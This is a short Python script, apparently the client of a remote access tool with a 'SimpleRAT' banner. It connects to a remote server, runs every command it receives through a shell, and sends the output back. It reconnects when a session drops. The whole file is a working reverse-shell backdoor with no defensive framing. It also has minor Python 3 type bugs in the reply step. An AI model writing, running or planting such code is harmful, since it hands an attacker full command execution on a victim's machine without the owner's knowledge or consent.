#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import os
import time
import subprocess
import sys
from colorama import Fore

yellow = Fore.YELLOW
reset = Fore.RESET

host = '0.0.0.0'
port = int(input("Port ~> "))
def c():
	clear = lambda:os.system('cls' if os.name == 'nt' else 'clear')
	clear()
	print(reset,'''
   _____            __    ___  ___ ______
  / __(_)_ _  ___  / /__ / _ \/ _ /_  __/
 _\ \/ /  ' \/ _ \/ / -_) , _/ __ |/ /
/___/_/_/_/_/ .__/_/\__/_/|_/_/ |_/_/
           /_/
''')

def interpreter():
    term = s.recv(1024).decode()
    proc = subprocess.Popen(term, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    exit = proc.stdout.read() + proc.stderr.read()
    if(exit == ''):
        s.send('OK!')
    else:
        s.send(exit)

while True:
    try:
        c()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print(yellow,"[+] Connected")
        while True:
            try:
                interpreter()
            except socket.error:
                print(yellow,"[-] Connection error")
                break
        print(yellow,"[-] Session finished")
        time.sleep(5)
        s.close()
        print(yellow,"[!] Reconnecting to the server")

    except socket.error:
        print(yellow,"[-] Can't reach the server...")
        sys.exit(1)
